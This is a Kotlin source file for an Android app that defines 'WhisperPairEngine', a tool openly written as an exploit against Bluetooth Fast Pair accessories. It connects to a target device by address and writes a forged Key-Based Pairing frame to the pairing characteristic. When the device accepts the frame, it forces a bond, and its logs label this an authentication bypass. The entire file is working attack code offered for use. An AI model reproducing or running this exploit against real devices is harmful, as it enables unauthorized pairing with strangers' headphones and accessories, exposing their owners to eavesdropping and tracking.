package com.logm1lo.ctos

import android.annotation.SuppressLint
import android.bluetooth.*
import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log
import java.util.*
import kotlin.random.Random

class WhisperPairEngine(private val context: Context) {
    private val TAG = "WhisperPairEngine"
    private val bluetoothAdapter: BluetoothAdapter? by lazy {
        (context.getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager).adapter
    }
    private var bluetoothGatt: BluetoothGatt? = null

    companion object {
        val SERVICE_UUID: UUID = UUID.fromString("0000fe2c-0000-1000-8000-00805f9b34fb")
        val KEY_BASED_PAIRING_UUID: UUID = UUID.fromString("fe2c1234-8366-4814-8eb0-01de32100bea")
    }

    @SuppressLint("MissingPermission")
    fun startExploit(address: String, onProgress: (String) -> Unit, onResult: (Boolean, String) -> Unit) {
        Log.d(TAG, "[startExploit] → Entry: address=$address")
        val device = bluetoothAdapter?.getRemoteDevice(address)
        if (device == null) {
            Log.e(TAG, "[startExploit] → Error: Target device not found")
            onResult(false, "Device not found")
            return
        }

        onProgress("Connecting to GATT...")
        Log.d(TAG, "[startExploit] → Status: Initiating GATT connection")
        bluetoothGatt = device.connectGatt(context, false, object : BluetoothGattCallback() {
            override fun onConnectionStateChange(gatt: BluetoothGatt, status: Int, newState: Int) {
                Log.d(TAG, "[onConnectionStateChange] → Status: status=$status, newState=$newState")
                if (newState == BluetoothProfile.STATE_CONNECTED) {
                    onProgress("Connected. Discovering services...")
                    Log.d(TAG, "[onConnectionStateChange] → Status: Connected, discovering services")
                    gatt.discoverServices()
                } else if (newState == BluetoothProfile.STATE_DISCONNECTED) {
                    Log.w(TAG, "[onConnectionStateChange] → Status: Disconnected")
                    onResult(false, "Disconnected")
                }
            }

            override fun onServicesDiscovered(gatt: BluetoothGatt, status: Int) {
                Log.d(TAG, "[onServicesDiscovered] → Status: status=$status")
                val service = gatt.getService(SERVICE_UUID)
                val characteristic = service?.getCharacteristic(KEY_BASED_PAIRING_UUID)
                
                if (characteristic != null) {
                    onProgress("Vulnerable characteristic found. Sending KBP request...")
                    Log.d(TAG, "[onServicesDiscovered] → Status: Found vulnerable target. Injecting forged KBP frame")
                    val request = buildKbpRequest(gatt.device.address)
                    characteristic.value = request
                    gatt.writeCharacteristic(characteristic)
                } else {
                    Log.e(TAG, "[onServicesDiscovered] → Error: Fast Pair Service missing or patched")
                    onResult(false, "Fast Pair Service not found")
                }
            }

            override fun onCharacteristicWrite(gatt: BluetoothGatt, characteristic: BluetoothGattCharacteristic, status: Int) {
                Log.d(TAG, "[onCharacteristicWrite] → Status: uuid=${characteristic.uuid}, status=$status")
                if (status == BluetoothGatt.GATT_SUCCESS) {
                    onProgress("KBP Request Accepted! Initiating bonding...")
                    Log.d(TAG, "[onCharacteristicWrite] → Status: AUTH_BYPASS_SUCCESS! Triggering forced bond")
                    device.createBond()
                    onResult(true, "Exploit Successful - Bonding initiated")
                } else {
                    Log.e(TAG, "[onCharacteristicWrite] → Error: Injection rejected (status: $status)")
                    onResult(false, "Exploit rejected by device (status: $status)")
                }
            }
        }, BluetoothDevice.TRANSPORT_LE)
        Log.d(TAG, "[startExploit] → Exit: Connection process started")
    }

    private fun buildKbpRequest(providerAddress: String): ByteArray {
        Log.v(TAG, "[buildKbpRequest] → Entry: providerAddress=$providerAddress")
        val addressBytes = providerAddress.split(":").map { it.toInt(16).toByte() }.toByteArray()
        val salt = Random.nextBytes(8)
        val request = ByteArray(16)
        request[0] = 0x00 // MSG_KEY_BASED_PAIRING_REQUEST
        request[1] = 0x11 // Flags: initiate bonding + extended response
        System.arraycopy(addressBytes, 0, request, 2, 6)
        System.arraycopy(salt, 0, request, 8, 8)
        Log.v(TAG, "[buildKbpRequest] → Exit: Frame generated")
        return request
    }

    @SuppressLint("MissingPermission")
    fun cleanup() {
        Log.d(TAG, "[cleanup] → Entry")
        bluetoothGatt?.disconnect()
        bluetoothGatt?.close()
        bluetoothGatt = null
        Log.d(TAG, "[cleanup] → Exit: Engine reset")
    }
}
